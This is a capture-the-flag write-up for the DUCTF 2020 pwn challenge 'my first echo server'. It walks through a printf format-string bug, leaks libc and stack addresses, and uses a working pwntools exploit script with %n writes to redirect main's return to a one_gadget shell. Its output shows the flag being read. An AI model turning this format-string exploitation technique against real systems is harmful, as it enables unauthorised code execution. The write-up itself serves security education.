# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
DUCTF 2020

# Category
pwn

# Challenge Name
my first echo server

# Challenge Points
416 pts

# Challenge Description
Hello there! I learnt C last week and already made my own SaaS product, check it out! I even made sure not to use compiler flags like --please-make-me-extremely-insecure, so everything should be swell.

`nc chal.duc.tf 30001`

Hint - The challenge server is running Ubuntu 18.04.

# Attachments
## echos
```
echos: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0d6839dfdaaca4eb1f1633da5a97772999c1c0e9, not stripped
```
ghidra decompilation:
```c
int main(void)

{
  long in_FS_OFFSET;
  int i;
  char my_input [72];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  while (i < 3) {
    fgets(my_input,0x40,stdin);
    printf(my_input);
    i = i + 1;
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

# Solution
## The Program
When we run `echos`, we get an empty prompt. We can see in `ghidra`'s decompilation of the program's main function that it loops three times using `fgets` to take an input (of length 0x40, or 64) and printing out the input with `printf`.

## Getting a Foothold
Since 0x40 < 72 (the length of the input buffer), and the function has a stack canary, it's pretty safe to say it's not vulnerable to a buffer overflow. However, the program passes our input to `printf` as the **first argument**, as the format string, rather than a safer arrangement like this:
```c
printf("%s", my_input);
```
So, what happens if we ask `printf` to insert a pointer into the output?
```
%p
0x7ffee4768cd0
```
We get one! `printf` doesn't know that we didn't pass it another argument, it just grabs a value off of the stack where the second argument would have been placed.

Now that we have our foothold, what can we do with it?

## The Exploit
### Leaking libc
If we want a shell, then we're going to need to jump into libc. Thanks to ALSR, libc is going to load into a different address in memory on every run, so we need to leak an address pointing into it. Since the `printf` is called in the `main` function, all we need to do is leak our way up to `main`'s return address, which should be in `__libc_start_main`. We can choose how far up the stack we want to go by adding a `$` sign into our format specifier like this: `%10$p` (for if we wanted the 10th qword), and I found the return address at `%19$p` (with the help of `gdb`).

### Finding the libc Version
At this point, we run into a bit of a problem: what version of libc is the remote machine running? They tell us that it's on Ubuntu 18.04, which narrows it down to libc 2.27, but there a still a couple different versions of that. One thing we can do to confirm the libc version is to read some addresses of libc functions from the program's global offset table, and then to plug those into a libc database (I used [this online database](https://libc.nullbyte.cat/)). However, looking at the output of `checksec` (a tool built into `pwnlib`) we see that the program has PIE enabled, meaning that it loads into memory at a different address each time it is run:
```
[*] '/ctf/ductf20/echos'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
So, first we need to leak an address of a part of the main program. I found the address of `__libc_csu_init` at `%18$p` (again, with the help of `gdb`). Now that we can get the base address of the program, we know the address of the global offset table entries. The question now is how we can print them.

It turns out that since our input is stored in a buffer on the stack, we can reach it with our `printf` specifiers. What this means is that we can put an address into our input and print it out again with `%9$p` (with experimentation I found it was at the 9th qword). So, we can use a `%9$s` to essentially dereference it because the `%s` specifier expects to find something like a `char *` and it prints whatever is at the address. Then, as I mentioned before, we can read from global offset table addresses and look them up in a libc database. From there, we just need to download that version of libc so we can use it to calculate offsets.

### Making the Leap
Now, to redirect code execution, we need to overwrite some pointer which the program will jump to. It turns out that we can actually perform arbitrary writes using the `%n` format specifier. This writes the number of characters that come before it in the output to an address on the stack. We know from leaking the global offset table that we can control the address this targets on the stack, and controlling the value we write is also not hard. Even though we are limited to 0x40 characters of input, we can extend the length seen by `%n` simply by having `printf` insert padding. For example, `%16x` would print the next hex value off the stack, padded to 16 characters. Though, really, we don't have to worry about the writing process too much because `pwntools` can actually do that for us (see the final exploit script).

For a place to jump to, I ran `one_gadget` on libc to get a few addresses that would give us a shell:
```python
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

The last thing to do is to write an address of one of these somewhere that meets the constraints. One common target would be the global offset table, but looking back at the output of `checksec` we see it's read-only thanks to full RELRO. Luckily, the stack has a few addresses pointing to other places on the stack, so we can caluculate the stack address of `main`'s return address from an offset from one of those. By checking in `gdb`, we can see that rsp+0x70 is 0x00000000 when `main` returns, meaning we can use the third of the above `one_gadget`s. This is what my final exploit script looks like:
```python
#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./echos
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./echos')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
host = 'chal.duc.tf'
port = 30001

def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        p = process([exe.path] + argv, *a, **kw)
        # print the pid so I can attach a debugger
        print(p.pid)
        input()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(host, port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

pl = b'%19$lx ' # libc.sym['__libc_start_main'] + 231
pl += b'%6$lx ' # stack, ret - 0x68

# pad to max size
pl += b'A'*0x40
pl = pl[:0x40 - 1] # -1 for the newline/null

log.info(f'sending first payload {repr(pl)}')

io.send(pl)

# parse leaks
res = io.recv().decode()
addrs = [int(x, 16) for x in res.split(' ')]

# calculate addresses from leaks and offsets
libc.address = addrs[0] - 231 - libc.sym['__libc_start_main']
ret_addr = addrs[1] + 0x48

log.info(f'libc at: {hex(libc.address)}')
log.info(f'ret at: {hex(ret_addr)}')

writes = {ret_addr: libc.address + 0x10a38c} # go to one_gadget
pl = fmtstr_payload(8, writes, write_size='short') # our input is at 8th qword

# pad to max size
pl += b'A'*0x40
pl = pl[:0x40 - 1] # -1 for the newline/null

log.info(f'sending second payload {repr(pl)}')
log.info(f'writing {hex(libc.address + 0x4f365)} to {hex(ret_addr)}')

io.send(pl)

# first give one random input to finish the loop and return to a shell
io.interactive()
```

Let's try it out:
```
[*] '/ctf/ductf20/echos'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/ductf20/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30001: Done
[*] sending first payload b'%19$lx %6$lx AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[*] libc at: 0x7f7c914c8000
[*] ret at: 0x7ffd6da3d5d8
[*] sending second payload b'%9100c%13$lln%23536c%14$hn%4577c%15$hnaa\xd8\xd5\xa3m\xfd\x7f\x00\x00\xdc\xd5\xa3m\xfd\x7f\x00\x00\xda\xd5\xa3m\xfd\x7f\x00'
[*] writing 0x7f7c91517365 to 0x7ffd6da3d5d8
[*] Switching to interactive mode

 ...

              \x81aa\xd8\xd5\$ anything
anything
$ ls
echos
flag.txt
$ cat flag.txt
DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
```